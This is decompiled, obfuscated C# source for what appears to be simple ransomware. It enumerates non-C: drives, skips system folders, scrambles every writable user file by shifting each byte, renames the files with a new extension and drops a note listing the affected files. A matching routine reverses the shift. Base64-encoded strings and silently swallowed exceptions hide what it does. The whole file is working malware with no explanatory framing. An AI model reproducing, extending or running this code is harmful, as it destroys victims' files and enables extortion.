using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace ns0;

public class GClass0
{
	public static List<string> list_0 = new List<string>();

	public static void smethod_0(string string_0)
	{
		GClass2.string_1 = GClass2.string_1.Replace(Encoding.UTF8.GetString(Convert.FromBase64String("PGZpbGVzY291bnQ+")), list_0.Count.ToString() ?? Encoding.UTF8.GetString(Convert.FromBase64String("")));
		string text = Encoding.UTF8.GetString(Convert.FromBase64String(""));
		foreach (string item in list_0)
		{
			text = text + item + Encoding.UTF8.GetString(Convert.FromBase64String("DQo="));
		}
		GClass2.string_1 = GClass2.string_1.Replace(Encoding.UTF8.GetString(Convert.FromBase64String("PGZpbGVzPg==")), text);
		try
		{
			string directoryName = Path.GetDirectoryName(string_0);
			directoryName = directoryName + Encoding.UTF8.GetString(Convert.FromBase64String("XA==")) + GClass2.string_2;
			if (!File.Exists(directoryName))
			{
				File.WriteAllText(directoryName, GClass2.string_1);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_1()
	{
		foreach (string item in list_0)
		{
			if (File.Exists(item))
			{
				try
				{
					File.Move(item, item + GClass2.string_0);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	public static void smethod_2(string string_0)
	{
		if (!string_0.EndsWith(GClass2.string_2) && !string_0.EndsWith(GClass2.string_3) && !string_0.EndsWith(GClass2.string_4))
		{
			byte[] array = File.ReadAllBytes(string_0);
			byte[] array2 = new byte[array.Length];
			for (int i = 0; i < array2.Length; i++)
			{
				char c = (char)array[i];
				c = (char)(c + 1);
				byte b = (array2[i] = (byte)c);
			}
			File.WriteAllBytes(string_0, array2);
			File.Move(string_0, string_0 + GClass2.string_0);
			smethod_0(string_0);
			GClass1.smethod_1(string_0);
			if (!list_0.Contains(string_0))
			{
				list_0.Add(string_0);
			}
		}
	}

	public static void smethod_3()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (driveInfo.IsReady && !driveInfo.Name.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("Qw=="))))
				{
					smethod_5(driveInfo.Name);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static List<string> smethod_4(string string_0)
	{
		List<string> list = new List<string>();
		try
		{
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("QXBwRGF0YVw="))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("V2luZG93c1w="))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("Q29tbW9uIEZpbGVzXA=="))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("V2luZG93c1Bvd2VyU2hlbGxc"))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("TWljcm9zb2Z0XFByb3Zpc2lvbmluZ1w="))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("UHJvZ3JhbURhdGE="))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("UHJvZ3JhbSBGaWxlcw=="))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("Q2FjaGU="))))
			{
				return list;
			}
			if (string_0.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("JA=="))))
			{
				return list;
			}
			string[] files = Directory.GetFiles(string_0);
			foreach (string item in files)
			{
				list.Add(item);
			}
			string[] directories = Directory.GetDirectories(string_0);
			foreach (string string_ in directories)
			{
				list.AddRange(smethod_4(string_));
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	public static void smethod_5(string string_0)
	{
		try
		{
			smethod_6(string_0);
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_6(string string_0)
	{
		List<string> list = smethod_4(string_0);
		foreach (string item in list)
		{
			try
			{
				if (!item.EndsWith(GClass2.string_0))
				{
					bool flag = false;
					bool flag2 = false;
					bool flag3 = new FileInfo(item).Attributes.HasFlag(FileAttributes.ReadOnly);
					using (FileStream fileStream = new FileStream(item, FileMode.Open))
					{
						flag2 = fileStream.CanRead;
						flag = fileStream.CanWrite;
					}
					if (!flag3 && flag && flag2)
					{
						smethod_2(item);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static void smethod_7(string string_0)
	{
		byte[] array = File.ReadAllBytes(string_0);
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array2.Length; i++)
		{
			char c = (char)array[i];
			c = (char)(c - 1);
			byte b = (array2[i] = (byte)c);
		}
		File.WriteAllBytes(string_0, array2);
		File.Move(string_0, string_0.Substring(0, string_0.Length - GClass2.string_0.Length));
	}
}
